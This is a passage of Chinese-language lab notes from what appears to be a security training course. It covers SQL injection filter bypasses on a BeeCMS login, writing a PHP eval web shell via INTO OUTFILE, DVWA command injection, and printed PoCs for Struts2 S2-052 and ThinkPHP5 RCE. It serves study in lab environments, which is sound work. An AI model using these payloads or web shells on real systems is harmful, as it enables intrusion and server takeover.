<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index3.php?id=1%9c%27"</span> -D hetianlab -T<span class="built_in"> user </span>--dump</span><br></pre></td></tr></table></figure>





<h2><span id="绕过select过滤">绕过select过滤</span></h2><p>尝试<code>union%20select%201,2,3</code>,发现select 被过滤了。</p>
<p>尝试重写绕过<code>union seselectlect 1,2,3</code>成功。或者大小写绕过也成功<code>union Select 1,2,3</code>成功。</p>
<p>过滤语句应该是进行简单的替换。</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">id = <span class="number">1</span> <span class="class"><span class="keyword">union</span>%20<span class="title">Select</span>%201,<span class="title">username</span>,<span class="title">password</span>%20<span class="title">from</span>%20<span class="title">user</span></span></span><br></pre></td></tr></table></figure>

<p>账户名： admin ，密码： 21232f297a57a5a743894a0e4a801fc3</p>
<p>或者sqlmap:</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://47.105.75.177/vulnlab/sqli/index5.php?id=1"</span> --tamper <span class="string">"nonrecursivereplacement.py"</span></span><br></pre></td></tr></table></figure>



<h2><span id="进阶之真实案例">进阶之真实案例</span></h2><p>随便浏览发现可能注入点：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/</span>sqli<span class="regexp">/beecms/</span>product<span class="regexp">/product.php?id=5</span></span><br></pre></td></tr></table></figure>

<p>多番尝试后发现注不出来。</p>
<p>dirsearch扫描。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">python .\dirsearch.py -u http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms -e php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="number">12</span>:<span class="number">34</span>:<span class="number">56</span>] <span class="number">301</span> -  <span class="number">255</span>B  - /vulnlab/sqli/beecms/admin  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/admin/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">34</span>:<span class="number">57</span>] <span class="number">302</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/admin/  -&gt;  login.php</span><br><span class="line">[<span class="number">12</span>:<span class="number">34</span>:<span class="number">57</span>] <span class="number">403</span> -  <span class="number">237</span>B  - /vulnlab/sqli/beecms/admin/.htaccess</span><br><span class="line">[<span class="number">12</span>:<span class="number">34</span>:<span class="number">57</span>] <span class="number">302</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/admin/?/login  -&gt;  login.php</span><br><span class="line">[<span class="number">12</span>:<span class="number">34</span>:<span class="number">57</span>] <span class="number">302</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/admin/admin.php  -&gt;  login.php</span><br><span class="line">[<span class="number">12</span>:<span class="number">34</span>:<span class="number">57</span>] <span class="number">302</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/admin/index.php  -&gt;  login.php</span><br><span class="line">[<span class="number">12</span>:<span class="number">34</span>:<span class="number">58</span>] <span class="number">200</span> -    <span class="number">2</span>KB - /vulnlab/sqli/beecms/admin/login.php</span><br><span class="line">[<span class="number">12</span>:<span class="number">34</span>:<span class="number">58</span>] <span class="number">302</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/admin/upload.php  -&gt;  login.php</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">02</span>] <span class="number">301</span> -  <span class="number">257</span>B  - /vulnlab/sqli/beecms/article  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/article/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">04</span>] <span class="number">301</span> -  <span class="number">254</span>B  - /vulnlab/sqli/beecms/book  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/book/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">05</span>] <span class="number">301</span> -  <span class="number">258</span>B  - /vulnlab/sqli/beecms/ckeditor  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/ckeditor/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">05</span>] <span class="number">200</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/ckeditor/</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">07</span>] <span class="number">301</span> -  <span class="number">254</span>B  - /vulnlab/sqli/beecms/data  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/data/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">08</span>] <span class="number">301</span> -  <span class="number">254</span>B  - /vulnlab/sqli/beecms/down  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/down/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">11</span>] <span class="number">301</span> -  <span class="number">258</span>B  - /vulnlab/sqli/beecms/includes  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/includes/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">11</span>] <span class="number">200</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/includes/</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">11</span>] <span class="number">200</span> -   <span class="number">18</span>KB - /vulnlab/sqli/beecms/index.php</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">12</span>] <span class="number">200</span> -   <span class="number">18</span>KB - /vulnlab/sqli/beecms/index.php/login/</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">12</span>] <span class="number">301</span> -  <span class="number">257</span>B  - /vulnlab/sqli/beecms/install  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/install/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">12</span>] <span class="number">200</span> -   <span class="number">89</span>B  - /vulnlab/sqli/beecms/install/</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">13</span>] <span class="number">301</span> -  <span class="number">259</span>B  - /vulnlab/sqli/beecms/languages  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/languages/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">14</span>] <span class="number">301</span> -  <span class="number">256</span>B  - /vulnlab/sqli/beecms/member  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/member/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">14</span>] <span class="number">200</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/member/</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">19</span>] <span class="number">301</span> -  <span class="number">257</span>B  - /vulnlab/sqli/beecms/product  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/product/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">20</span>] <span class="number">200</span> -  <span class="number">140</span>B  - /vulnlab/sqli/beecms/robots.txt</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">20</span>] <span class="number">301</span> -  <span class="number">256</span>B  - /vulnlab/sqli/beecms/search  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/search/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">21</span>] <span class="number">301</span> -  <span class="number">257</span>B  - /vulnlab/sqli/beecms/sitemap  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/sitemap/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">23</span>] <span class="number">301</span> -  <span class="number">258</span>B  - /vulnlab/sqli/beecms/template  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/template/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">23</span>] <span class="number">200</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/template/</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">24</span>] <span class="number">301</span> -  <span class="number">256</span>B  - /vulnlab/sqli/beecms/upload  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/upload/</span></span><br></pre></td></tr></table></figure>

<p>发现后台地址：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/</span>sqli<span class="regexp">/beecms/</span>admin<span class="regexp">/</span></span><br></pre></td></tr></table></figure>

<p>尝试sql注入:</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">用户名：admin' or <span class="number">1</span></span><br><span class="line">密码：<span class="number">123</span></span><br></pre></td></tr></table></figure>

<p>报错:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">You have an <span class="builtin-name">error</span> <span class="keyword">in</span> your SQL syntax; check the<span class="built_in"> manual </span>that corresponds <span class="keyword">to</span> your MariaDB<span class="built_in"> server </span>version <span class="keyword">for</span> the right syntax <span class="keyword">to</span> use near <span class="string">''</span> limit 0,1<span class="string">' at line 1</span></span><br><span class="line"><span class="string">sql:select id,admin_name,admin_password,admin_purview,is_disable from bees_admin where admin_name='</span>admin<span class="string">' or 1'</span> limit 0,1</span><br></pre></td></tr></table></figure>

<p>现在直接构造payload注入：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">用户名：admin<span class="string">' and '</span><span class="number">1</span></span><br><span class="line">密码：<span class="number">123</span></span><br></pre></td></tr></table></figure>



<p>提示不存在用户。尝试另外种思路：</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">用户名：admi' union select <span class="number">1</span>,<span class="number">2</span>,'pwd',<span class="number">4</span>,<span class="number">5</span> #</span><br><span class="line">密码： pwd</span><br></pre></td></tr></table></figure>

<p>报错：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,admin_name,admin_password,admin_purview,is_disable <span class="keyword">from</span> bees_admin <span class="keyword">where</span> admin_name=<span class="string">'admi'</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'pwd'</span>,<span class="number">4</span>,<span class="number">5</span> <span class="comment">#' limit 0,1</span></span><br></pre></td></tr></table></figure>

<p>发现union 和select被过滤了。</p>
<p>尝试绕过方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">（1）UnunionIon  显示UnunionIon</span><br><span class="line">（2）Union 显示空</span><br><span class="line">（2）Un union ion 显示union 成功绕过。</span><br></pre></td></tr></table></figure>

<p>重新构造payload:</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">用户名：admi' Un union ion Se select lect <span class="number">1</span>,<span class="number">2</span>,'pwd',<span class="number">4</span>,<span class="number">5</span> #</span><br><span class="line">密码： pwd</span><br></pre></td></tr></table></figure>

<p>发现select函数有问题了，</p>
<p>尝试绕过方法：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">Se<span class="symbol">%select</span><span class="symbol">%lect</span>  显示<span class="keyword">select</span></span><br></pre></td></tr></table></figure>

<p>再构造payload:</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">用户名：admi' Un union ion Se%select%lect <span class="number">1</span>,<span class="number">2</span>,'pwd',<span class="number">4</span>,<span class="number">5</span> #</span><br><span class="line">密码： pwd</span><br></pre></td></tr></table></figure>

<p>说密码正确，猜想密码是密文保存的。用md5。</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">用户名：admi' Un union ion Se%select%lect <span class="number">1</span>,<span class="number">2</span>,'<span class="number">9003</span>d1df22eb4d3820015070385194c8',<span class="number">4</span>,<span class="number">5</span> #</span><br><span class="line">密码：pwd</span><br></pre></td></tr></table></figure>

<p>注入成功，提示该账号被锁定，无法登录。</p>
<p>发现字段is_disable被设置成5所以不能登录，改下payload:</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">用户名：admi' Un union ion Se%select%lect <span class="number">1</span>,'admin','<span class="number">9003</span>d1df22eb4d3820015070385194c8',<span class="number">4</span>,<span class="number">0</span> #</span><br><span class="line">密码：pwd</span><br></pre></td></tr></table></figure>

<p>成功登录。</p>
<p>尝试文件注入：</p>
<p>首先绕过Into，outfile关键词，用<code>I into nto, O%outfile%utfile</code>替换</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">用户名： admi<span class="string">' Un union ion Se%select%lect 1,'</span><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[x]);<span class="meta">?&gt;</span><span class="string">',3,4,5 I into nto  O%outfile%utfile '</span>shell.php<span class="string">' #</span></span><br></pre></td></tr></table></figure>



<p>test:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admi' Un union ion Se%<span class="keyword">select</span>%lect <span class="number">1</span>,<span class="string">'&lt;?php echo 1;?&gt;'</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> I <span class="keyword">into</span> nto  O%<span class="keyword">outfile</span>%utfile <span class="string">'../upload/shell1.php'</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>报错:</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">操作数据库失败Can<span class="string">'t create/write to file '</span>/var/<span class="class"><span class="keyword">lib</span>/<span class="title">mysql</span>/<span class="title">upload</span>/<span class="title">shell1</span>.<span class="title">php</span>'</span></span><br></pre></td></tr></table></figure>



<p>猜测路径：<br>/var/www/html/vulnlab/sqli/beecms/upload/</p>
<p>构造payload上传即可。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">admi<span class="string">' Un union ion Se%select%lect 1,'</span>&lt;?php @eval(<span class="variable">$_POST</span>[x]);?&gt;<span class="string">',3,4,5 I into nto  O%outfile%utfile '</span><span class="regexp">/var/</span>www<span class="regexp">/html/</span>vulnlab<span class="regexp">/sqli/</span>beecms<span class="regexp">/upload/</span>shell.php<span class="string">' #</span></span><br></pre></td></tr></table></figure>

<p>测试下：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">admi<span class="string">' Un union ion Se%select%lect 1,'</span>&lt;?php echo <span class="number">1</span>?&gt;<span class="string">',3,4,5 I into nto  O%outfile%utfile '</span><span class="regexp">/var/</span>www<span class="regexp">/html/</span>vulnlab<span class="regexp">/sqli/</span>beecms<span class="regexp">/upload/</span><span class="number">1</span>.php<span class="string">' #</span></span><br></pre></td></tr></table></figure>

<p>发现内容为：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">&amp;lt;?php echo <span class="number">1</span>;?&amp;gt;	<span class="number">3</span>	<span class="number">4</span>	<span class="number">5</span></span><br></pre></td></tr></table></figure>

<p>所有特殊字符被转义了。所以利用胖白老大讲的char函数。</p>
<p>利用hackbar生成</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">CHAR(<span class="number">60</span>, <span class="number">63</span>, <span class="number">112</span>, <span class="number">104</span>, <span class="number">112</span>, <span class="number">32</span>, <span class="number">64</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">40</span>, <span class="number">36</span>, <span class="number">95</span>, <span class="number">71</span>, <span class="number">69</span>, <span class="number">84</span>, <span class="number">91</span>, <span class="number">120</span>, <span class="number">93</span>, <span class="number">41</span>, <span class="number">59</span>, <span class="number">63</span>, <span class="number">62</span>)</span><br></pre></td></tr></table></figure>

<p>所以payload为</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">admi' Un union ion Se%select%lect <span class="number">1</span>,CHAR(<span class="number">60</span>, <span class="number">63</span>, <span class="number">112</span>, <span class="number">104</span>, <span class="number">112</span>, <span class="number">32</span>, <span class="number">64</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">40</span>, <span class="number">36</span>, <span class="number">95</span>, <span class="number">80</span>, <span class="number">79</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">91</span>, <span class="number">120</span>, <span class="number">93</span>, <span class="number">41</span>, <span class="number">59</span>, <span class="number">63</span>, <span class="number">62</span>),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> I into nto  O%outfile%utfile '/var/www/html/vulnlab/sqli/beecms/upload/shell2.php' #</span><br></pre></td></tr></table></figure>

<p>然后用菜刀连接即可。</p>
<p>注意点：一句话木马是用的POST不是GET</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>合天培训_实验_命令执行</title>
    <url>/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<p>本文主要描述了：（1）一些软件出现的命令执行漏洞（包括dvwa,struts,thinkphp,ImageMagick)（2）可能出现命令执行漏洞的<strong>PHP代码执行函数</strong>分析。（3）能执行系统命令的<strong>系统命令执行函数</strong>分析</p>
<a id="more"></a>

<h2><span id="1-命令执行漏洞">1. 命令执行漏洞</span></h2><p>（1）实验介绍</p>
<p>实验链接： <a href="http://www.hetianlab.com/expc.do?ce=39594afc-5c80-4d51-8f99-7cb54e20b401" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=39594afc-5c80-4d51-8f99-7cb54e20b401</a> </p>
<p>实验来源：合天网安实验室</p>
<p>实验目的： 通过实验理解命令实验漏洞的原理和利用方法。 </p>
<p>（2）实验操作</p>
<p>1）该实验是DVWA命令执行漏洞实验，先打开10.1.1.174然后输入账号密码进去，查看安全等级发现是high，将其设置成low。然后开始命令执行测试。</p>
<p>2）正常业务。发现在命令执行处可以输入ip地址，然后可以得到ping ip后的结果。</p>
<p>尝试127.0.0.1</p>
<p><img src="/assets/image-20200426123935628.png" alt="image-20200426123935628"></p>
<p>3）fuzz测试。可以进行命令执行fuzz测试，发现很多符号都没被过滤。所以可以尝试攻击。</p>
<p>4）构造payload</p>
<ul>
<li><p>127.0.0.1 | net user          查看用户</p>
<p><img src="/assets/image-20200426124613975.png" alt="image-20200426124613975"></p>
</li>
<li><p>127.0.0.1 | echo “<?php phpinfo; ?>“ &gt; 1.php        写php文件</p>
</li>
</ul>
<p><img src="/assets/image-20200426125031831.png" alt="image-20200426125031831"></p>
<ul>
<li>127.0.0.1 | echo “<?php @eval($_POST['cmd']); ?>“ &gt; shell.php 写shell</li>
</ul>
<p>用菜刀连接</p>
<p><img src="/assets/image-20200426125304313.png" alt="image-20200426125304313"></p>
<p><img src="/assets/image-20200426125326981.png" alt="image-20200426125326981"></p>
<p>由于实验机里没有nc工具就不尝试反弹shell了。</p>
<p>5)medium难度操作</p>
<p>通过fuzz发现&amp;&amp;和;被过滤了。</p>
<ul>
<li>127.0.0.1;dir</li>
</ul>
<p><img src="/assets/image-20200426130010047.png" alt="image-20200426130010047"></p>
<ul>
<li><p>127.0.0.1 &amp;&amp; dir</p>
<p><img src="/assets/image-20200426130102921.png" alt="image-20200426130102921"></p>
</li>
</ul>
<p>但是因为过滤不全所以可以用其他符号可以绕过，比如low中用的|</p>
<p>如果非要用&amp;&amp;可以使用下面方式：</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span> &amp;;&amp; dir</span><br></pre></td></tr></table></figure>

<p>所以medium存在问题是使用黑名单，且黑名单机制不全。</p>
<h2><span id="2-cve-2017-9805struts2-052漏洞实验">2. CVE-2017-9805Struts2-052漏洞实验</span></h2><p>（1）实验介绍</p>
<p>实验链接：  <a href="http://www.hetianlab.com/expc.do?ce=c9b7ee13-33d3-4317-b31c-c9a80a8ad0a2" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=c9b7ee13-33d3-4317-b31c-c9a80a8ad0a2</a> </p>
<p>实验来源：合天网安实验室</p>
<p>实验目的： 了解S2-052 Struts2远程命令执行漏洞危害；掌握检测利用S2-052 Struts2远程命令执行漏洞技术</p>
<p>（2）实验操作</p>
<p>1）搭建实验环境。</p>
<p>tomcat开启。下载软件源代码，部署war文件。打开  <a href="http://127.0.0.1:8080/struts2-rest-showcase" target="_blank" rel="noopener">http://127.0.0.1:8080/struts2-rest-showcase</a> 网站进行测试，成功显示，环境搭建成功。然后配置burp进行抓包，注意tomcat默认端口为8080，所以burp可以改为8090端口。</p>
<p>2）正常业务</p>
<p>点击edit，随便输入内容提交，成功提交。</p>
<p>3）poc测试</p>
<p><img src="/assets/image-20200426141646790.png" alt="image-20200426141646790"></p>
<p>发现报错500，rce成功。而且弹出了计算器。</p>
<p>4）漏洞分析</p>
<p>XStreamHandler这个类对http请求中content-type是application/xml的，调用XStream进行处理。而XStreamHandler中的toObject()方法未对传入的值进行任何限制，导致XStream反序列化转化为对象时任意代码执行。</p>
<p>5）poc分析</p>
<p>poc:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span> <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span> <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"</span>&gt;</span> <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span> <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"</span>&gt;</span> <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">"javax.crypto.CipherInputStream"</span>&gt;</span> <span class="tag">&lt;<span class="name">cipher</span> <span class="attr">class</span>=<span class="string">"javax.crypto.NullCipher"</span>&gt;</span> <span class="tag">&lt;<span class="name">initialized</span>&gt;</span>false<span class="tag">&lt;/<span class="name">initialized</span>&gt;</span> <span class="tag">&lt;<span class="name">opmode</span>&gt;</span>0<span class="tag">&lt;/<span class="name">opmode</span>&gt;</span> <span class="tag">&lt;<span class="name">serviceIterator</span> <span class="attr">class</span>=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt;</span> <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt;</span> <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">"java.util.Collections$EmptyIterator"</span>/&gt;</span> <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span> <span class="tag">&lt;<span class="name">command</span>&gt;</span> <span class="tag">&lt;<span class="name">string</span>&gt;</span>cacl<span class="tag">&lt;/<span class="name">string</span>&gt;</span> <span class="tag">&lt;/<span class="name">command</span>&gt;</span> <span class="tag">&lt;<span class="name">redirectErrorStream</span>&gt;</span>false<span class="tag">&lt;/<span class="name">redirectErrorStream</span>&gt;</span> <span class="tag">&lt;/<span class="name">next</span>&gt;</span> <span class="tag">&lt;/<span class="name">iter</span>&gt;</span> <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"javax.imageio.ImageIO$ContainsFilter"</span>&gt;</span> <span class="tag">&lt;<span class="name">method</span>&gt;</span> <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span> <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span> <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span> <span class="tag">&lt;/<span class="name">method</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">name</span>&gt;</span> <span class="tag">&lt;/<span class="name">filter</span>&gt;</span> <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">"string"</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">next</span>&gt;</span> <span class="tag">&lt;/<span class="name">serviceIterator</span>&gt;</span> <span class="tag">&lt;<span class="name">lock</span>/&gt;</span> <span class="tag">&lt;/<span class="name">cipher</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder$NullInputStream"</span>/&gt;</span> <span class="tag">&lt;<span class="name">ibuffer</span>&gt;</span><span class="tag">&lt;/<span class="name">ibuffer</span>&gt;</span> <span class="tag">&lt;<span class="name">done</span>&gt;</span>false<span class="tag">&lt;/<span class="name">done</span>&gt;</span> <span class="tag">&lt;<span class="name">ostart</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ostart</span>&gt;</span> <span class="tag">&lt;<span class="name">ofinish</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ofinish</span>&gt;</span> <span class="tag">&lt;<span class="name">closed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">closed</span>&gt;</span> <span class="tag">&lt;/<span class="name">is</span>&gt;</span> <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span> <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span> <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span> <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span> <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span> <span class="tag">&lt;/<span class="name">value</span>&gt;</span> <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span> <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">"../jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span> <span class="tag">&lt;/<span class="name">entry</span>&gt;</span> <span class="tag">&lt;<span class="name">entry</span>&gt;</span> <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span> <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure>





<p>poc看不懂，分析是传入xml文件，估计下面语句</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;command&gt;</span><span class="symbol">&lt;string&gt;</span>C:\Windows\System32\calc.<span class="keyword">exe</span>&lt;/<span class="built_in">string</span>&gt;&lt;/<span class="keyword">command</span>&gt;</span><br></pre></td></tr></table></figure>

<p>被当作命令执行。</p>
<h2><span id="3-thinkphp5-远程命令执行漏洞">3. Thinkphp5 远程命令执行漏洞</span></h2><p>（1）实验介绍</p>
<p>实验链接：   <a href="http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f</a> </p>
<p>实验来源：合天网安实验室</p>
<p>实验目的： 通过该实验了解ThinkPHP5远程命令执行漏洞的原因和利用方法，以及如何修复该漏洞。 </p>
<p>（2）实验操作</p>
<p>1）安装环境。</p>
<ul>
<li>利用<code>netstat -tunlp</code>检测是否开启AMP。注意php端口为9000。</li>
<li>下载ThinkPhp源码，并部署到apache的web目录下。换机器测试发现成功安装。</li>
</ul>
<p>2）实验操作</p>
<p>直接利用实验里带的ThinkPHP5漏洞检测工具。</p>
<p><img src="/assets/image-20200426144136346.png" alt="image-20200426144136346"></p>
<p>发现poc。</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">index</span>.php?s=/<span class="keyword">index</span>/\think\request\<span class="keyword">cache</span>&amp;key=<span class="number">1</span>|phpinfo</span><br></pre></td></tr></table></figure>



<p>测试</p>
<p><img src="/assets/image-20200426144439093.png" alt="image-20200426144439093"></p>
<p>发现正确。然后getshell.</p>
<p><img src="/assets/image-20200426144235821.png" alt="image-20200426144235821"></p>
<p>3）漏洞分析</p>
<p>a. $this-&gt;config-&gt;get(‘var_pathinfo’)是配置文件的默认值，初始化值为s 。而pathinfo来自<code>$_GET[$this-&gt;config-&gt;get(&#39;var_pathinfo&#39;)]</code>，所以可以通过控制输入的参数s来控制pathinfo.</p>
<p>b. 特定条件下，path变量等于pathinfo控制。而path又被传入了router-&gt;check()函数，然后交给url解析。</p>
<p>c.解析url时，Url模块把url解析为三部分。模块/控制器/操作。而模块，控制器，操作都是可控的。</p>
<p>问题出在对控制器的处理中，如果发现控制器以反斜杠开始时，直接将其作为类名赋值给$class并返回，最后会实例化这个类。</p>
<p>e.Module.php中用param获取实例化类对应的参数，然后通过invokeMethod函数动态调用方法。</p>
<p>4）poc</p>
<p>poc不懂。。。</p>
<h2><span id="4-imagemagick漏洞">4. ImageMagick漏洞</span></h2><p>（1）实验介绍</p>
